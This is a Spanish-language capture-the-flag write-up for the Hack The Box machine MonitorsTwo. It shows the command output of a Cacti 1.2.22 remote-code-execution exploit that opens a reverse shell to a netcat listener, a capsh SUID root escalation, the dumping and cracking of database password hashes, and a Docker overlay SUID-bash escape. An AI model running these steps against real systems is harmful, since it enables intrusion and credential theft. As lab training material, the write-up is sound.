---
layout: post
title: MonitorsTwo
date: 2023-09-03
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Monitorstwo-htb/MonitorsTwo.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.211 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 20:46 GMT
Nmap scan report for 10.10.11.211
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.211 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 20:47 GMT
Nmap scan report for 10.10.11.211
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.211
http://10.10.11.211 [200 OK] Cacti, Cookies[Cacti], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[Cacti], IP[10.10.11.211], JQuery, PHP[7.4.33], PasswordField[login_password], Script[text/javascript], Title[Login to Cacti], UncommonHeaders[content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.4.33], X-UA-Compatible[IE=Edge], nginx[1.18.0]
```

La página principal se ve así:

<img src="/writeups/assets/img/Monitorstwo-htb/1.png" alt="">

Esta versión es vulnerable a RCE

```null
searchsploit cacti 1.2.22
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Cacti v1.2.22 - Remote Command Execution (RCE)                                                                                                                                | php/webapps/51166.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Descargo el exploit y antes de ejecutarlo, modifico la cabecera ```X-Forwarded-For``` para que apunte al localhost

```null
headers = {
    'X-Forwarded-For': f'127.0.0.1'
}
```

Devuelve la siguiente data

```null
python3 exploit.py -u http://10.10.11.211/ -i 10.10.16.15 -p 443
200 - [{"value":"53","rrd_name":"proc","local_data_id":"1"}]
200 - [{"value":"1min:0.04 5min:0.03 10min:0.00","rrd_name":"","local_data_id":"2"}]
200 - [{"value":"0","rrd_name":"users","local_data_id":"3"}]
200 - [{"value":"2181516","rrd_name":"mem_buffers","local_data_id":"4"}]
200 - [{"value":"1048572","rrd_name":"mem_swap","local_data_id":"5"}]
200 - [{"value":"0","rrd_name":"uptime","local_data_id":"6"}]
```

Me quedo en escucha con ```netcat``` y recibo una shell

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.11.211] 58060
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
bash-5.1$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
bash-5.1$ export TERM=xterm
bash-5.1$ export SHELL=bash
bash-5.1$ stty rows 55 columns 209
```

Estoy dentro de un contenedor

```null
bash-5.1$ whoami
www-data
bash-5.1$ hostname -I
172.19.0.3 
```

Busco por binarios SUID en el sistema

```null
bash-5.1$ find \-perm \-4000 2>/dev/null 
./usr/bin/gpasswd
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/chfn
./usr/bin/newgrp
./sbin/capsh
./bin/mount
./bin/umount
./bin/su
```

Puedo abusar de ```capsh``` según [GTFObins](https://gtfobins.github.io/gtfobins/capsh/)

```null
bash-5.1$ capsh --gid=0 --uid=0 --
root@50bca5e748b0:/# 
```

Subo el ```linpeas``` y encuentra credenciales en texto claro de acceso a la base de datos

```null
╔══════════╣ Searching passwords in config PHP files
#$rdatabase_password = 'cactiuser';
$database_password = 'root';
					$password = $value;
		$password = $database_password;
```

En la raíz se puede ver un archivo ```EntryPoint.sh```

```null
root@50bca5e748b0:/# cat entrypoint.sh 
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"
```

Me conecto a la base de datos

```null
root@50bca5e748b0:/# mysql --host=db --user=root --password=root cacti -e "show databases"
+--------------------+
| Database           |
+--------------------+
| information_schema |
| cacti              |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

Listo las tablas de usuarios

```null
root@50bca5e748b0:/# mysql --host=db --user=root --password=root cacti -e "use cacti; show tables;" | grep user
settings_user
settings_user_group
user_auth
user_auth_cache
user_auth_group
user_auth_group_members
user_auth_group_perms
user_auth_group_realm
user_auth_perms
user_auth_realm
user_domains
user_domains_ldap
user_log
```

Y listo las columnas de ```user_auth```

```null
root@50bca5e748b0:/# mysql --host=db --user=root --password=root cacti -e "use cacti; describe user_auth;"
+------------------------+-----------------------+------+-----+---------+----------------+
| Field                  | Type                  | Null | Key | Default | Extra          |
+------------------------+-----------------------+------+-----+---------+----------------+
| id                     | mediumint(8) unsigned | NO   | PRI | NULL    | auto_increment |
| username               | varchar(50)           | NO   | MUL | 0       |                |
| password               | varchar(256)          | NO   |     |         |                |
```

Me quedo con el usuario y la contraseña

```null
root@50bca5e748b0:/# mysql --host=db --user=root --password=root cacti -e "use cacti; select username,password from user_auth;"
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$oI0hHsxD3wY8yUv4FL1qEeOAqHfPTZP9SNgAhgLGmUbHGm03VHrem |
| guest    | 43e9a4ab75570f5b                                             |
| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+----------+--------------------------------------------------------------+
```

Las crackeo con ```john```



Me conecto como ```marcus``` y puedo ver la primera flag

```null
ssh marcus@10.10.11.211
marcus@10.10.11.211's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 01 Jun 2023 03:36:10 PM UTC

  System load:                      0.0
  Usage of /:                       63.3% of 6.73GB
  Memory usage:                     27%
  Swap usage:                       0%
  Processes:                        276
  Users logged in:                  1
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:6703


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Thu Jun  1 14:35:57 2023 from 10.10.14.107
marcus@monitorstwo:~$ cat user.txt 
e52fd2bb5815e69ba3e679e12694d3a9
```

# Escalada

Subo el ```linpeas``` y encuentra un correo

```null
╔══════════╣ Mails (limit 50)
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/mail/marcus
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/spool/mail/marcus
```

```null
marcus@monitorstwo:/var/mail$ cat marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

Listo las monturas

```null
marcus@monitorstwo:/var/mail$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            1.9G     0  1.9G   0% /dev
tmpfs           394M  1.3M  392M   1% /run
/dev/sda2       6.8G  4.3G  2.4G  65% /
tmpfs           2.0G     0  2.0G   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
overlay         6.8G  4.3G  2.4G  65% /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
shm              64M     0   64M   0% /var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
overlay         6.8G  4.3G  2.4G  65% /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
shm              64M     0   64M   0% /var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
tmpfs           394M     0  394M   0% /run/user/1000
```

El último contenedor que aparece en la lista corresponde al que tengo acceso como ```root```, por lo que puedo copiarme la ```bash``` desde allí, asignarle el privilegio SUID y ejecutarla desde el host

```null
root@50bca5e748b0:/tmp# rm bash test 
root@50bca5e748b0:/tmp# cp /bin/bash .
root@50bca5e748b0:/tmp# chmod u+s ./bash 
```

```null
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp$ ./bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
43a1f5b26eab16b80233e36201bb8261
```